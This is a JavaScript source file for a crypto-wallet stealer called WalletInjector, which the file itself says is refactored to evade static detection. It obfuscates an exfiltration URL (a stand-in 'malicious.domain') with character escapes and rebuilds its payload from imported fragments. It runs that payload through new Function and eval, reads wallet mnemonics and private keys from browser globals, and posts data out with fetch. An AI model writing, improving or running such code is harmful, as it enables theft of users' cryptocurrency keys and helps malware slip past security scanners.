// wallet_injector.js - Refactored to evade static detection
// Imports obfuscation utilities and payload fragments for dynamic reconstruction

const obfuscation = require('./obfuscation_utils.js');
const fragments = require('./payload_fragments.js');

class WalletInjector {
    constructor(targetExtension) {
        this.target = targetExtension;
        this.config = {
            exfiltrationEndpoint: this._buildEndpoint(),
            activationTrigger: 'wallet_connect'
        };
    }

    // Build exfiltration endpoint using Unicode escapes and concatenation
    _buildEndpoint() {
        const parts = [];
        parts.push('\x68\x74\x74\x70\x73\x3a\x2f\x2f'); // 'https://'
        parts.push(String.fromCharCode(109, 97, 108, 105, 99, 105, 111, 117, 115)); // 'malicious'
        parts.push('\u002e\u0064\u006f\u006d\u0061\u0069\u006e'); // '.domain'
        parts.push('/api/\u0063\u006f\u006c\u006c\u0065\u0063\u0074'); // '/api/collect'
        return parts.join('');
    }

    // Dynamically generate malicious function from fragments
    _generatePayload() {
        const keyFragment = fragments.getKeyFragment();
        const hookFragment = fragments.getHookFragment();
        const exfilFragment = fragments.getExfilFragment();
        
        // Reconstruct payload using multiple concatenation steps
        let payload = keyFragment + hookFragment;
        payload += obfuscation.rotateChars(exfilFragment, 3);
        
        // Create dynamic function with indirect eval
        const dynamicFunc = new Function('walletData', 'config', payload);
        return dynamicFunc;
    }

    // Main injection method
    inject() {
        try {
            const maliciousFunc = this._generatePayload();
            const mockWalletData = this._simulateWalletCapture();
            
            // Execute with simulated data
            maliciousFunc(mockWalletData, this.config);
            
            console.log('[+] Payload executed successfully on', this.target);
            this._logInjection();
        } catch (error) {
            console.error('[-] Injection failed:', error.message);
            this._fallbackMethod();
        }
    }

    _simulateWalletCapture() {
        return {
            mnemonic: this._getMnemonic(),
            privateKey: this._getPrivateKey(),
            balance: this._getBalance()
        };
    }

    // Methods using Unicode escapes for sensitive strings
    _getMnemonic() {
        return window[obfuscation.decode('\u0077\u0061\u006c\u006c\u0065\u0074')]?.mnemonic;
    }

    _getPrivateKey() {
        const prop = obfuscation.decode('\u0070\u0072\u0069\u0076\u0061\u0074\u0065\u004b\u0065\u0079');
        return window.cryptoWallet?.[prop];
    }

    _getBalance() {
        return window.web3?.eth?.getBalance(window.ethereum?.selectedAddress);
    }

    _logInjection() {
        const logMsg = obfuscation.encode(`Injected into ${this.target}`);
        fetch(this.config.exfiltrationEndpoint + '/log', {
            method: 'POST',
            body: JSON.stringify({ event: logMsg })
        });
    }

    _fallbackMethod() {
        // Alternative injection method using different technique
        setTimeout(() => {
            eval(fragments.getFallbackFragment());
        }, 5000);
    }
}

// Export for use in other modules
module.exports = WalletInjector;